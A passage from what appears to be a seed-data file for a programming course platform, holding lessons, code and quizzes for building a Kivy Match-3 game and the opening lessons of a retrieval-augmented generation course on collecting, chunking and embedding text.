      ],
    },
  },
  {
    title: 'Modeling the Board',
    content: lessonContent(
      'Modeling the Board',
      `Before drawing a single gem on screen, it's worth building the board as plain Python data, completely separate from Kivy. This keeps the game's rules testable and easy to reason about, the UI will just be a thin layer that reads and updates this data.\n\n## Representing the grid\n\nAn 8×8 board is a list of 8 rows, each row a list of 8 gems. Each gem is just a string naming its color:\n\n\`\`\`\nimport random\n\nBOARD_SIZE = 8\nGEM_COLORS = ['red', 'blue', 'green', 'yellow', 'purple']\n\ndef make_board():\n    return [\n        [random.choice(GEM_COLORS) for _col in range(BOARD_SIZE)]\n        for _row in range(BOARD_SIZE)\n    ]\n\nboard = make_board()\nprint(board[0])   # the top row, e.g. ['red', 'purple', 'blue', ...]\nprint(board[3][5])  # the gem at row 3, column 5\n\`\`\`\n\n\`board[row][col]\` is the indexing convention used for the rest of this project, the outer list is rows (top to bottom), the inner list is columns (left to right) within that row.\n\n## Why keep the model separate from the UI?\n\nIt's tempting to store the gem's color as a property directly on a Kivy \`Button\`, and read it back from there whenever you need it. Resist that: keeping \`board\` as a plain Python list means:\n\n- You can write and test match-detection logic (next lesson) with no Kivy window involved at all, just \`print(board)\`.\n- The UI's only job becomes "read \`board\` and draw it", and "translate taps back into changes to \`board\`", nothing about *how a gem looks* needs to leak into the rules for *how gems match and fall*.\n\n\`\`\`\ndef adjacent(pos1, pos2):\n    r1, c1 = pos1\n    r2, c2 = pos2\n    return abs(r1 - r2) + abs(c1 - c2) == 1\n\nprint(adjacent((3, 4), (3, 5)))  # True, same row, next column\nprint(adjacent((3, 4), (4, 5)))  # False, diagonal, not adjacent\n\`\`\`\n\n\`abs(r1 - r2) + abs(c1 - c2)\` is the **Manhattan distance** between two grid positions, it equals exactly \`1\` only when the two cells share a row or column and are right next to each other, exactly the "adjacent" rule a Match-3 swap needs, no diagonals allowed.\n\n> [!NOTE]\n> \`random.choice(GEM_COLORS)\` doesn't check whether it accidentally created a match while building the initial board, that's fine for this project's prototype scope, a production game would re-roll any gem that would start pre-matched.`
    ),
    quiz: {
      title: 'Modeling the Board Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In this project\'s board representation, what does board[3][5] refer to?',
          options: ['Row 5, column 3', 'Row 3, column 5', 'The 3rd board', 'A GEM_COLORS index'],
          answer: 'Row 3, column 5',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two grid positions are adjacent (for swapping purposes) if they are diagonal to each other.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'abs(r1 - r2) + abs(c1 - c2) computes the ____ distance between two grid positions.',
          options: [],
          answer: 'Manhattan',
        },
      ],
    },
  },
  {
    title: 'Displaying the Board',
    content: lessonContent(
      'Displaying the Board',
      `With \`make_board()\` producing the data and \`GridLayout\` able to hold an 8×8 grid of buttons, this lesson connects the two: turning the plain Python \`board\` into actual colored gems on screen.\n\n## Mapping colors to RGBA\n\n\`\`\`\nGEM_RGBA = {\n    'red':    (0.9, 0.2, 0.2, 1),\n    'blue':   (0.2, 0.4, 0.9, 1),\n    'green':  (0.2, 0.8, 0.3, 1),\n    'yellow': (0.95, 0.85, 0.2, 1),\n    'purple': (0.6, 0.2, 0.8, 1),\n}\n\`\`\`\n\nEvery gem color string from \`board\` needs a matching entry here, this dictionary is the only place that translates the game's data (plain strings) into something Kivy can actually render.\n\n## Building the grid of buttons\n\n\`\`\`\nfrom kivy.app import App\nfrom kivy.uix.gridlayout import GridLayout\nfrom kivy.uix.button import Button\n\nclass Match3App(App):\n    def build(self):\n        self.board = make_board()\n        self.grid = GridLayout(cols=BOARD_SIZE)\n        self.buttons = {}  # (row, col) -> Button, so taps can be mapped back to a position\n\n        for row in range(BOARD_SIZE):\n            for col in range(BOARD_SIZE):\n                gem = Button(text='', background_normal='')\n                self.buttons[(row, col)] = gem\n                self.grid.add_widget(gem)\n\n        self.render_board()\n        return self.grid\n\n    def render_board(self):\n        for row in range(BOARD_SIZE):\n            for col in range(BOARD_SIZE):\n                color = self.board[row][col]\n                self.buttons[(row, col)].background_color = GEM_RGBA[color]\n\nif __name__ == '__main__':\n    Match3App().run()\n\`\`\`\n\nA few things worth noticing:\n\n- \`self.buttons\` is a dictionary keyed by \`(row, col)\`, created once in \`build()\`. Every later lesson looks up "which button is at this position?" through this dictionary rather than re-creating widgets, Kivy widgets are relatively expensive to create, so the board reuses the same 64 buttons for the entire game.\n- \`render_board()\` is deliberately a separate method from \`build()\`: it only *reads* \`self.board\` and updates colors, it never creates new widgets. That means any later change to \`self.board\` (a swap, a match being cleared, gems falling) can be shown on screen just by calling \`self.render_board()\` again.\n- Note the important order: rows are added top to bottom, and within each row, columns left to right, matching \`GridLayout(cols=BOARD_SIZE)\`'s own top-to-bottom, left-to-right fill order, so \`self.buttons[(row, col)]\` really does end up in the right visual position.\n\n> [!TIP]\n> Separating "update the data" from "redraw from the data" (the same idea as Pygame's update/draw split) is what makes the rest of this game's logic straightforward: every lesson from here on just changes \`self.board\` and then calls \`self.render_board()\`.`
    ),
    quiz: {
      title: 'Displaying the Board Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does the app store buttons in a self.buttons dictionary keyed by (row, col) instead of recreating them?',
          options: [
            'Kivy requires dictionaries for layouts',
            'To reuse the same widgets and just update their colors, rather than recreating 64 buttons every frame',
            'Dictionaries render faster than lists',
            'It is required for touch input to work at all',
          ],
          answer: 'To reuse the same widgets and just update their colors, rather than recreating 64 buttons every frame',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'render_board() creates new Button widgets every time it runs.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'background_color expects an ____ tuple with each channel between 0 and 1.',
          options: [],
          answer: 'RGBA',
        },
      ],
    },
  },
  {
    title: 'Selecting and Swapping Gems',
    content: lessonContent(
      'Selecting and Swapping Gems',
      `With gems visible on screen, the next step is making them tappable: select one gem, tap an adjacent one, and swap them.\n\n## Tracking the current selection\n\n\`\`\`\nclass Match3App(App):\n    def build(self):\n        self.board = make_board()\n        self.selected = None  # will hold a (row, col) tuple, or None\n        self.grid = GridLayout(cols=BOARD_SIZE)\n        self.buttons = {}\n\n        for row in range(BOARD_SIZE):\n            for col in range(BOARD_SIZE):\n                gem = Button(text='', background_normal='')\n                gem.bind(on_press=self.make_gem_handler(row, col))\n                self.buttons[(row, col)] = gem\n                self.grid.add_widget(gem)\n\n        self.render_board()\n        return self.grid\n\n    def make_gem_handler(self, row, col):\n        def handler(instance):\n            self.on_gem_tapped(row, col)\n        return handler\n\`\`\`\n\n\`bind(on_press=...)\` only passes Kivy the *widget instance* that was pressed, not which row/col it represents. \`make_gem_handler(row, col)\` solves this with a **closure**: it returns a fresh \`handler\` function that remembers its own \`row\` and \`col\` from when it was created, one such closure is made per button, in the same loop that creates the button itself.\n\n## Handling a tap\n\n\`\`\`\n    def on_gem_tapped(self, row, col):\n        if self.selected is None:\n            self.selected = (row, col)\n            return\n\n        first = self.selected\n        second = (row, col)\n        self.selected = None\n\n        if first == second:\n            return  # tapped the same gem twice, treat as a deselect\n\n        if not adjacent(first, second):\n            self.selected = second  # start a fresh selection from here instead\n            return\n\n        self.swap(first, second)\n        self.render_board()\n\`\`\`\n\nThe logic has three outcomes for a second tap: the same gem (cancel), a non-adjacent gem (start over from that gem instead of swapping), or a valid adjacent gem (swap). Storing \`self.selected = None\` at the very top of the "second tap" branch, before any of those checks, means every path correctly clears the selection, there's no way to get stuck with a stale \`self.selected\`.\n\n## Swapping two positions\n\n\`\`\`\n    def swap(self, pos1, pos2):\n        r1, c1 = pos1\n        r2, c2 = pos2\n        self.board[r1][c1], self.board[r2][c2] = self.board[r2][c2], self.board[r1][c1]\n\`\`\`\n\nPython's tuple-assignment swap (\`a, b = b, a\`) works just as well on two list-of-list cells as it does on two plain variables, no temporary variable needed.\n\n> [!WARNING]\n> This lesson's version swaps unconditionally, even if the swap doesn't create any match. A real Match-3 game only allows swaps that produce at least one match, swapping back otherwise, that's exactly what the next lesson's match-detection makes possible.`
    ),
    quiz: {
      title: 'Selecting and Swapping Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does make_gem_handler(row, col) return a new function instead of binding one shared handler to every button?',
          options: [
            'Kivy requires a unique function object per widget',
            "So each button's handler remembers its own row/col via a closure, since on_press only passes the widget instance",
            'It makes the app start faster',
            'To avoid using self.board',
          ],
          answer: "So each button's handler remembers its own row/col via a closure, since on_press only passes the widget instance",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'a, b = b, a swaps two variables (or list cells) in Python without a temporary variable.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A function defined inside another function that remembers variables from the enclosing scope is called a ____.',
          options: [],
          answer: 'closure',
        },
      ],
    },
  },
  {
    title: 'Detecting Matches',
    content: lessonContent(
      'Detecting Matches',
      `Swapping gems is only useful once the game can tell whether that swap actually created a match, three or more identical gems in a row, either horizontally or vertically.\n\n## Scanning rows\n\n\`\`\`\ndef find_matches(board):\n    matched = set()\n\n    # horizontal runs\n    for row in range(BOARD_SIZE):\n        run_start = 0\n        for col in range(1, BOARD_SIZE + 1):\n            end_of_row = col == BOARD_SIZE\n            broke_run = end_of_row or board[row][col] != board[row][run_start]\n            if broke_run:\n                run_length = col - run_start\n                if run_length >= 3:\n                    for c in range(run_start, col):\n                        matched.add((row, c))\n                run_start = col\n\n    return matched\n\`\`\`\n\nThis walks each row left to right, tracking where the current run of identical gems started (\`run_start\`). Every time the gem changes (or the row ends), it checks whether the run that just ended was long enough (\`>= 3\`), and if so, adds every position in that run to \`matched\`. Using a loop bound of \`BOARD_SIZE + 1\` (not just \`BOARD_SIZE\`) is what lets the *last* run in the row get checked too, without it, a run reaching all the way to the last column would never trigger the "broke run" check.\n\n## Adding vertical runs\n\nColumns need the exact same logic, just swapped: outer loop over columns, inner loop over rows.\n\n\`\`\`\ndef find_matches(board):\n    matched = set()\n\n    for row in range(BOARD_SIZE):\n        run_start = 0\n        for col in range(1, BOARD_SIZE + 1):\n            end_of_row = col == BOARD_SIZE\n            broke_run = end_of_row or board[row][col] != board[row][run_start]\n            if broke_run:\n                if col - run_start >= 3:\n                    for c in range(run_start, col):\n                        matched.add((row, c))\n                run_start = col\n\n    for col in range(BOARD_SIZE):\n        run_start = 0\n        for row in range(1, BOARD_SIZE + 1):\n            end_of_col = row == BOARD_SIZE\n            broke_run = end_of_col or board[row][col] != board[run_start][col]\n            if broke_run:\n                if row - run_start >= 3:\n                    for r in range(run_start, row):\n                        matched.add((r, col))\n                run_start = row\n\n    return matched\n\`\`\`\n\n\`matched\` is a \`set\` of \`(row, col)\` tuples, not a list, deliberately: a gem at the intersection of a horizontal *and* vertical run (an L or T shape) would otherwise get added twice, a set automatically collapses duplicates.\n\n## Using it after a swap\n\n\`\`\`\n    def on_gem_tapped(self, row, col):\n        # ... same selection logic as the previous lesson ...\n        self.swap(first, second)\n\n        if find_matches(self.board):\n            self.render_board()\n        else:\n            self.swap(first, second)  # no match, swap back\n\`\`\`\n\nCalling \`self.swap(first, second)\` a second time with the same two positions undoes the first swap, exactly the "swap back if it didn't help" rule real Match-3 games use to stop players from making pointless moves.\n\n> [!TIP]\n> \`find_matches\` only reports *which cells matched*, it doesn't remove anything from the board itself, keeping "detect" and "remove" as separate steps (next lesson) makes each one easy to test on its own.`
    ),
    quiz: {
      title: 'Detecting Matches Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does find_matches return a set instead of a list?',
          options: [
            'Sets are required by Kivy',
            'To automatically avoid duplicate positions when a gem is part of both a horizontal and vertical match',
            'Sets preserve insertion order, lists do not',
            'It makes the loop run faster',
          ],
          answer: 'To automatically avoid duplicate positions when a gem is part of both a horizontal and vertical match',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Swapping the same two positions a second time undoes the first swap.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A run of identical gems only counts as a match once its length is 3 or ____.',
          options: [],
          answer: 'more',
        },
      ],
    },
  },
  {
    title: 'Clearing, Dropping, and Refilling',
    content: lessonContent(
      'Clearing, Dropping, and Refilling',
      `A detected match needs to actually disappear, let the gems above it fall down to fill the gap, and have brand-new gems spawn at the top, then check whether *that* created new matches, and repeat until the board settles. This is the "cascade" that makes Match-3 games feel alive.\n\n## Clearing matched gems\n\nAn empty cell is represented as \`None\`, distinct from any real gem color:\n\n\`\`\`\ndef clear_matches(board, matched):\n    for (row, col) in matched:\n        board[row][col] = None\n\`\`\`\n\n## Dropping gems down, column by column\n\n\`\`\`\ndef drop_gems(board):\n    for col in range(BOARD_SIZE):\n        # collect this column's surviving (non-None) gems, top to bottom\n        remaining = [board[row][col] for row in range(BOARD_SIZE) if board[row][col] is not None]\n        missing = BOARD_SIZE - len(remaining)\n\n        # empty space at the top, then the survivors settle to the bottom\n        new_column = [None] * missing + remaining\n\n        for row in range(BOARD_SIZE):\n            board[row][col] = new_column[row]\n\`\`\`\n\nBuilding a brand-new \`new_column\` list (rather than trying to shift entries in place) avoids a whole class of off-by-one bugs: \`remaining\` already has the survivors in the right relative order, padding \`missing\` \`None\`s in front of them is all it takes to push them down, since row \`0\` is the top of the board.\n\n## Spawning new gems in the empty top cells\n\n\`\`\`\ndef refill_board(board):\n    for row in range(BOARD_SIZE):\n        for col in range(BOARD_SIZE):\n            if board[row][col] is None:\n                board[row][col] = random.choice(GEM_COLORS)\n\`\`\`\n\nAfter \`drop_gems\`, every remaining \`None\` is guaranteed to be at the top of its column (that's exactly what the padding in \`drop_gems\` guaranteed), so \`refill_board\` can simply fill in any \`None\` it finds, no need to track which rows were affected.\n\n## Repeating until the board is stable\n\n\`\`\`\n    def resolve_matches(self):\n        matched = find_matches(self.board)\n        while matched:\n            clear_matches(self.board, matched)\n            drop_gems(self.board)\n            refill_board(self.board)\n            matched = find_matches(self.board)  # newly-fallen gems might match too\n\`\`\`\n\nThis \`while matched:\` loop is the "repeat until no matches remain" step: clearing and refilling can easily create *new* runs of 3 (a cascade), so the function keeps re-checking \`find_matches\` after every refill, only stopping once a full pass finds nothing left to clear.\n\n## Wiring it into a swap\n\n\`\`\`\n    def on_gem_tapped(self, row, col):\n        # ... selection logic ...\n        self.swap(first, second)\n\n        if find_matches(self.board):\n            self.resolve_matches()\n        else:\n            self.swap(first, second)\n\n        self.render_board()\n\`\`\`\n\n> [!WARNING]\n> \`resolve_matches\` only touches \`self.board\`, the plain Python data, it never calls \`self.render_board()\` itself. Forgetting to call \`render_board()\` after \`resolve_matches()\` (as the snippet above does, on the very last line) is a common bug, the board would be fully correct internally while the screen still shows the old, un-cleared gems.`
    ),
    quiz: {
      title: 'Clearing, Dropping & Refilling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does the game keep calling find_matches() again inside a while loop after refilling?',
          options: [
            'To detect the very first match only',
            'Because clearing and refilling gems can create new matches (cascades) that also need resolving',
            'It is required by Kivy to update the screen',
            'To slow the game down for animation purposes',
          ],
          answer: 'Because clearing and refilling gems can create new matches (cascades) that also need resolving',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In this board representation, None represents an empty cell, distinct from any real gem color.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'random.____(GEM_COLORS) picks one random gem color to fill an empty cell.',
          options: [],
          answer: 'choice',
        },
      ],
    },
  },
  {
    title: 'Final Project: Complete the Match-3 Prototype',
    content: lessonContent(
      'Final Project: Complete the Match-3 Prototype',
      `Every piece from this course now exists on its own: a board of random gems, a grid of tappable buttons, adjacent swapping, match detection, and clearing/dropping/refilling with cascades. This final project assembles all of it into one complete, playable prototype.\n\n## Requirements\n\nYour finished \`match3.py\` should satisfy every one of these:\n\n1. Creates an 8×8 board of randomly colored gems (\`make_board()\`).\n2. Displays the gems on screen as colored buttons in a \`GridLayout\` (\`render_board()\`).\n3. Lets the player select two gems by tapping them (\`self.selected\`, \`on_gem_tapped\`).\n4. Swaps two **adjacent** gems, and only two adjacent gems, non-adjacent taps should start a new selection instead of swapping (\`adjacent()\`, \`swap()\`).\n5. Detects 3-in-a-row matches, both horizontal and vertical (\`find_matches()\`).\n6. Replaces matched gems: clears them, drops the gems above down, spawns new random gems at the top, and repeats until no matches remain (\`resolve_matches()\`).\n\nBring the pieces from every earlier lesson together into one file, in this order works well:\n\n\`\`\`\nimport random\nfrom kivy.app import App\nfrom kivy.uix.gridlayout import GridLayout\nfrom kivy.uix.button import Button\n\nBOARD_SIZE = 8\nGEM_COLORS = ['red', 'blue', 'green', 'yellow', 'purple']\nGEM_RGBA = {\n    'red':    (0.9, 0.2, 0.2, 1),\n    'blue':   (0.2, 0.4, 0.9, 1),\n    'green':  (0.2, 0.8, 0.3, 1),\n    'yellow': (0.95, 0.85, 0.2, 1),\n    'purple': (0.6, 0.2, 0.8, 1),\n}\n\n\ndef make_board():\n    return [[random.choice(GEM_COLORS) for _ in range(BOARD_SIZE)] for _ in range(BOARD_SIZE)]\n\n\ndef adjacent(pos1, pos2):\n    r1, c1 = pos1\n    r2, c2 = pos2\n    return abs(r1 - r2) + abs(c1 - c2) == 1\n\n\ndef find_matches(board):\n    matched = set()\n\n    for row in range(BOARD_SIZE):\n        run_start = 0\n        for col in range(1, BOARD_SIZE + 1):\n            broke_run = col == BOARD_SIZE or board[row][col] != board[row][run_start]\n            if broke_run:\n                if col - run_start >= 3:\n                    for c in range(run_start, col):\n                        matched.add((row, c))\n                run_start = col\n\n    for col in range(BOARD_SIZE):\n        run_start = 0\n        for row in range(1, BOARD_SIZE + 1):\n            broke_run = row == BOARD_SIZE or board[row][col] != board[run_start][col]\n            if broke_run:\n                if row - run_start >= 3:\n                    for r in range(run_start, row):\n                        matched.add((r, col))\n                run_start = row\n\n    return matched\n\n\ndef clear_matches(board, matched):\n    for (row, col) in matched:\n        board[row][col] = None\n\n\ndef drop_gems(board):\n    for col in range(BOARD_SIZE):\n        remaining = [board[row][col] for row in range(BOARD_SIZE) if board[row][col] is not None]\n        missing = BOARD_SIZE - len(remaining)\n        new_column = [None] * missing + remaining\n        for row in range(BOARD_SIZE):\n            board[row][col] = new_column[row]\n\n\ndef refill_board(board):\n    for row in range(BOARD_SIZE):\n        for col in range(BOARD_SIZE):\n            if board[row][col] is None:\n                board[row][col] = random.choice(GEM_COLORS)\n\n\nclass Match3App(App):\n    def build(self):\n        self.board = make_board()\n        self.selected = None\n        self.grid = GridLayout(cols=BOARD_SIZE)\n        self.buttons = {}\n\n        for row in range(BOARD_SIZE):\n            for col in range(BOARD_SIZE):\n                gem = Button(text='', background_normal='')\n                gem.bind(on_press=self.make_gem_handler(row, col))\n                self.buttons[(row, col)] = gem\n                self.grid.add_widget(gem)\n\n        self.render_board()\n        return self.grid\n\n    def make_gem_handler(self, row, col):\n        def handler(instance):\n            self.on_gem_tapped(row, col)\n        return handler\n\n    def on_gem_tapped(self, row, col):\n        if self.selected is None:\n            self.selected = (row, col)\n            return\n\n        first = self.selected\n        second = (row, col)\n        self.selected = None\n\n        if first == second:\n            return\n        if not adjacent(first, second):\n            self.selected = second\n            return\n\n        self.swap(first, second)\n        if find_matches(self.board):\n            self.resolve_matches()\n        else:\n            self.swap(first, second)\n\n        self.render_board()\n\n    def swap(self, pos1, pos2):\n        r1, c1 = pos1\n        r2, c2 = pos2\n        self.board[r1][c1], self.board[r2][c2] = self.board[r2][c2], self.board[r1][c1]\n\n    def resolve_matches(self):\n        matched = find_matches(self.board)\n        while matched:\n            clear_matches(self.board, matched)\n            drop_gems(self.board)\n            refill_board(self.board)\n            matched = find_matches(self.board)\n\n    def render_board(self):\n        for row in range(BOARD_SIZE):\n            for col in range(BOARD_SIZE):\n                color = self.board[row][col]\n                self.buttons[(row, col)].background_color = GEM_RGBA[color]\n\n\nif __name__ == '__main__':\n    Match3App().run()\n\`\`\`\n\nRun it, click two adjacent gems, and you should see them swap, and if they formed a match, watch the board clear, drop, and refill down to a stable state.\n\n## Stretch goals (Hard): production-quality polish\n\nThe prototype above is a fully playable Match-3 game, but a production-quality version would add considerably more. Pick as many of these as you like:\n\n- **Animated swapping**, instead of an instant color-swap, gradually move the two gems toward each other's positions over a few frames using \`kivy.animation.Animation\`.\n- **Gems falling with physics**, drop new gems in from above the board and animate them falling into place, rather than appearing instantly.\n- **Cascading combos with a score system**, award more points for each successive cascade in a single \`resolve_matches()\` call, not just a flat amount per gem.\n- **Level objectives**, e.g. "collect 20 blue gems" or "reach 5,000 points in 30 moves", tracked and displayed alongside the board.\n- **Special gems**, a match of 4 creates a bomb (clears a 3×3 area when matched), a match of 5 creates a rainbow gem (clears every gem of one color).\n- **Particle effects**, a small burst of color where each gem is cleared.\n- **Sound effects**, a swap sound and a satisfying match/cascade sound with \`kivy.core.audio.SoundLoader\`.\n- **Swipe gestures**, detect a swipe direction with \`on_touch_down\`/\`on_touch_up\` instead of tap-tap-to-select, closer to how mobile Match-3 games actually feel.\n\nFor a real mobile release, using actual gem images (\`kivy.uix.image.Image\`) or Canvas drawing instead of flat button colors would make it feel far more like a real game. A reasonable project layout for that larger scope:\n\n\`\`\`\nMatch3 Game\n│\n├── main.py              # Starts app\n├── game.py              # Match-3 rules\n├── board.py             # Grid management\n├── gem.py               # Gem objects\n├── assets/\n│   ├── red.png\n│   ├── blue.png\n│   └── yellow.png\n└── sounds/\n    ├── swap.wav\n    └── match.wav\n\`\`\`\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const ragLessons: SeedLesson[] = [
  {
    title: 'Data Collection',
    content: lessonContent(
      'Data Collection',
      `**Retrieval-Augmented Generation** (RAG) is how you get an LLM to answer questions using *your* knowledge, not just whatever it happened to memorize during training. Instead of retraining the model, you retrieve relevant pieces of your own data at question-time and hand them to the model as extra context. This course builds a complete, working (if simplified) RAG pipeline in 8 steps, this lesson covers the first: gathering the raw knowledge.\n\n## Why RAG at all?\n\nAn LLM's knowledge is frozen at training time and limited to its context window, it can't answer questions about your company's private docs, yesterday's support tickets, or a codebase it's never seen. RAG fixes this by retrieving the *relevant* pieces of your own data and inserting them into the prompt, so the model answers grounded in real, current, specific information instead of guessing from what it half-remembers.\n\n## Gathering the raw knowledge\n\nReal sources are typically PDFs, docs, APIs, websites, and databases, a mix of structured and unstructured data. For this course, each "document" is just a Python string with a bit of metadata, so every lesson's code runs directly in your browser with no external files needed:\n\n\`\`\`python\nraw_documents = [\n    {\n        'source': 'onboarding.md',\n        'text': 'Kodstigen is a learning platform for programming courses. New students should start with the path that matches their goals, for example Python for general programming or DevOps for infrastructure.',\n    },\n    {\n        'source': 'faq.md',\n        'text': 'To reset your password, go to Settings and click Forgot Password. Password reset emails are sent from no-reply@codeforge.dev and expire after one hour.',\n    },\n    {\n        'source': 'billing.md',\n        'text': 'Kodstigen is currently free for all students. Instructors can submit courses and challenges for review, once approved they appear in the public catalog.',\n    },\n]\n\nfor doc in raw_documents:\n    print(doc['source'], '-', len(doc['text']), 'characters')\n\`\`\`\n\n## Structured vs. unstructured\n\n- **Unstructured data** (the kind this course focuses on) is free-form text: markdown docs, articles, chat transcripts. There's no fixed schema, just prose.\n- **Structured data** (rows in a database, JSON API responses) has a predictable shape, you'd typically convert it into descriptive text first (e.g. "Order #4821, shipped 2026-01-03, total $42.50") before it can flow through the same pipeline as unstructured text.\n\n> [!NOTE]\n> The goal of this step is simply to build your knowledge base, a collection of raw text your pipeline can later search through. Nothing here is chunked, embedded, or searchable yet, that's what the next several lessons build.`
    ),
    quiz: {
      title: 'Data Collection Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What problem does RAG solve for an LLM?',
          options: [
            'It makes the model respond faster',
            "It lets the model answer using your own, current data instead of only what it memorized during training",
            'It reduces the cost of every API call to zero',
            'It replaces the need for a system prompt',
          ],
          answer: "It lets the model answer using your own, current data instead of only what it memorized during training",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Structured data (like database rows) usually needs to be converted into descriptive text before it flows through the same RAG pipeline as unstructured documents.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The goal of the data collection step is to build your ____ ____, a collection of raw text to search through later.",
          options: [],
          answer: 'knowledge base',
        },
      ],
    },
  },
  {
    title: 'Data Chunking',
    content: lessonContent(
      'Data Chunking',
      `A whole document is usually too big and too broad to embed and search effectively, this lesson splits each document into small, focused pieces, called **chunks**.\n\n## Why chunk at all?\n\nEmbedding an entire multi-page document into a single vector loses precision, the vector ends up representing an average of many different topics. Splitting into smaller chunks means each vector represents one focused idea, which makes retrieval far more accurate: a query about "password reset" should match a small chunk about password reset, not an entire FAQ document that also happens to mention pricing and onboarding.\n\n## A simple word-based chunker\n\nProduction systems typically aim for chunks of around 200-500 tokens. This course uses much smaller chunks (a handful of words) so you can see the effect clearly on short example text:\n\n\`\`\`python\ndef chunk_text(text, chunk_size=12, overlap=3):\n    words = text.split()\n    chunks = []\n    start = 0\n    while start < len(words):\n        end = start + chunk_size\n        chunk = ' '.join(words[start:end])\n        chunks.append(chunk)\n        start += chunk_size - overlap\n    return chunks\n\ntext = (\n    'Kodstigen is a learning platform for programming courses. '\n    'New students should start with the path that matches their goals, '\n    'for example Python for general programming or DevOps for infrastructure.'\n)\n\nfor i, chunk in enumerate(chunk_text(text)):\n    print(f'Chunk {i}: {chunk!r}')\n\`\`\`\n\n## Why the overlap?\n\nWithout overlap, a sentence that happens to straddle two chunk boundaries gets cut in half, one chunk ends mid-thought and the next picks up without its earlier context. \`overlap=3\` repeats the last 3 words of one chunk at the start of the next, so a query matching that boundary sentence still finds enough surrounding context in at least one of the two chunks.\n\n\`\`\`python\ndef test_boundary():\n    boundary_text = 'one two three four five six seven eight nine ten eleven twelve thirteen fourteen'\n    chunks = chunk_text(boundary_text, chunk_size=6, overlap=2)\n    for chunk in chunks:\n        print(chunk)\n\ntest_boundary()\n\`\`\`\n\nNotice each chunk's last two words reappear as the next chunk's first two words, that repetition is deliberate.\n\n> [!TIP]\n> \`chunk_size\` and \`overlap\` are tunable, smaller chunks give more precise retrieval but more of them to search through, larger chunks keep more context together but dilute the embedding. There's no single correct answer, it depends on your documents.`
    ),
    quiz: {
      title: 'Data Chunking Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does chunking improve retrieval accuracy compared to embedding a whole document at once?',
          options: [
            'It makes the document shorter to store',
            "Each smaller chunk's vector represents one focused idea instead of an average of many topics",
            'It removes the need for embeddings entirely',
            'It automatically translates the text',
          ],
          answer: "Each smaller chunk's vector represents one focused idea instead of an average of many topics",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Overlap between chunks helps prevent a sentence at a chunk boundary from losing its surrounding context.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Production RAG systems typically aim for chunks around 200 to ____ tokens.',
          options: [],
          answer: '500',
        },
      ],
    },
  },
  {
    title: 'Embedding',
    content: lessonContent(
      'Embedding',
      `Chunks of text are still just text, computers can't directly measure how "similar" two pieces of text are unless that meaning is turned into numbers. This lesson converts each chunk into an **embedding**: a vector of numbers that captures its meaning.\n\n## The real-world version\n\nIn production, you'd call an embedding model, most commonly a hosted API like OpenAI's:\n\n\`\`\`\nfrom openai import OpenAI\n\nclient = OpenAI()\n\ndef embed(text):\n    response = client.embeddings.create(model='text-embedding-3-small', input=text)\n    return response.data[0].embedding  # a list of ~1536 floats\n\`\`\`\n\n*This needs a real OpenAI API key and network access, so it's read-only here, every other block in this lesson runs directly in your browser.* A real embedding model has learned, from enormous amounts of text, that phrases like "AI is powerful" and "machine intelligence is strong" should produce nearly identical vectors, even though they don't share a single word, that's what "captures semantic meaning" means in practice.\n\n## A toy embedding you can actually run here\n\nWithout a paid API, this course uses a much simpler stand-in: a **bag-of-words** vector, just a count of how often each word appears. It only catches exact word overlap, not true meaning, but it demonstrates the *mechanism*, text in, vector out, that every later lesson builds on:\n\n\`\`\`python\nimport re\nfrom collections import Counter\n\ndef toy_embed(text):\n    words = re.findall(r\"[a-z']+\", text.lower())\n    return Counter(words)\n\nvector = toy_embed('Password reset emails expire after one hour.')\nprint(vector)\n\`\`\`\n\n\`Counter\` is a dictionary subclass from Python's standard library that counts items, here it counts how many times each lowercase word appears. Two chunks that share more of the same words will end up with more overlapping keys, which the next lessons use to measure similarity.\n\n> [!NOTE]\n> A \`Counter\` mapping words to counts *is* a vector, mathematically, just a sparse one where most possible words have a count of zero and aren't stored at all. Real embedding vectors are dense (every one of their ~1536 numbers is meaningful) and capture meaning rather than exact wording, but the underlying idea, "text becomes a list of numbers you can compare", is exactly the same.`
    ),
    quiz: {
      title: 'Embedding Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a real embedding model capture that this course\'s toy_embed() does not?',
          options: [
            'The length of the text',
            'Semantic meaning, so different wordings of the same idea produce similar vectors',
            'The number of words in the text',
            'Whether the text contains a question mark',
          ],
          answer: 'Semantic meaning, so different wordings of the same idea produce similar vectors',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A Counter of word counts is, mathematically, a form of vector.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "OpenAI's client.embeddings.create(...) returns a response whose data[0].embedding is a list of ____.",
          options: [],
